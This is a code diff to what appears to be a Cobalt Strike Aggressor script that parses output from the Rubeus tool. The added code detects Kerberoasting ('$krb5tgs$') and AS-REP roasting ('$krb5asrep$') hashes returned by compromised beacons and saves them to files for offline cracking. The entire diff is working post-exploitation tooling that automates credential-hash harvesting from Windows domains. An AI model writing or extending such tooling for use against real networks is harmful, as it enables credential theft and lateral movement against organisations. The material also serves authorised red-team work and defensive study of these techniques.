@@ -204,6 +204,67 @@ sub parseRubeusDump {
     }
 }
 
+sub parseRubeusRoast {
+    $bid = $1;
+    $hashes = $2;
+    $hashStartPattern = $3;
+    $hashEndPattern = "\r\n\r\n";
+    $counter = 1;
+
+    while ( $counter < 500 ) # avoid infinite loops
+    {
+        try
+        {
+            if ($hashStartPattern isin $hashes)
+            {
+                $hashStartIndex = indexOf($hashes, $hashStartPattern);   # find start of hash
+            }
+
+            if ( $hashStartIndex is $null ) # stop searching if no more hashes
+            {
+                break;
+            }
+
+            # parse out hash
+            $hashEndIndex = indexOf($hashes, $hashEndPattern, $hashStartIndex + strlen($hashStartPattern)); 
+
+
+            if ( $hashEndIndex is $null ) # stop searching if no more hashes
+            {
+                break;
+            }
+
+            $hash = substr($hashes, $hashStartIndex, $hashEndIndex);
+            $hash = trimString($hash);
+
+            if ( "tgs" isin $hashStartPattern )
+            {
+                $filename = getDirectory() . "/hashes-kerberoasting.txt";
+                saveText($filename, $hash);
+            }
+            else if ( "asrep" isin $hashStartPattern )
+            {
+                $filename = getDirectory() . "/hashes-asreproast.txt";
+                saveText($filename, $hash);
+            }
+
+            $hashes = substr($hashes, $hashEndIndex); # grab individual hash
+            $counter++; 
+        }
+        catch $message 
+        { 
+            btask($bid, "WARNING: Unable to obtain hash\nERROR: $message");
+            println("WARNING: Unable to obtain hash\nERROR: $message");
+            println(getStackTrace()); 
+            $counter++; 
+        }
+    }
+    if ( $counter > 1 ) 
+    {
+        btask($bid, "Hashes have been saved at: $filename");
+    }
+}
+
 sub parseRubeusCatchAll {
     $bid = $1;
     $kerbTickets = $2;
@@ -403,6 +464,8 @@ on beacon_output {
     $checkRubeusPatternMonitor = " - 4624 logon event for "; # pattern to search for monitor module
     $s4uPattern = "[*] Action: S4U"; # ignore tickets from Rubeus s4u module
     $checkUnknownTicketPattern = "[*] base64(ticket.kirbi):"; # sometimes cobalt strike output is sent in unexpected chunks, epecially at sleep 0.  This pattern is to make sure ticket gets saved even if we don't know which Rubeus module it comes from.
+    $checkRubeusRoastPattern1 = "\$krb5tgs\$";
+    $checkRubeusRoastPattern2 = "\$krb5asrep\$";
     $beaconOutput = replace($2, "received output:\n", "");
 
     if ($s4uPattern isin $beaconOutput)
@@ -424,6 +487,14 @@ on beacon_output {
     else if ($checkRubeusPatternDump3 isin $beaconOutput) 
     {
         parseRubeusDump($bid, $beaconOutput);
+    }
+    else if ($checkRubeusRoastPattern1 isin $beaconOutput)
+    {
+        parseRubeusRoast($bid, $beaconOutput, $checkRubeusRoastPattern1);
+    }
+    else if ($checkRubeusRoastPattern2 isin $beaconOutput)
+    {
+        parseRubeusRoast($bid, $beaconOutput, $checkRubeusRoastPattern2);
     }
     else if ($checkRubeusPatternAsk3 isin $beaconOutput)
     {
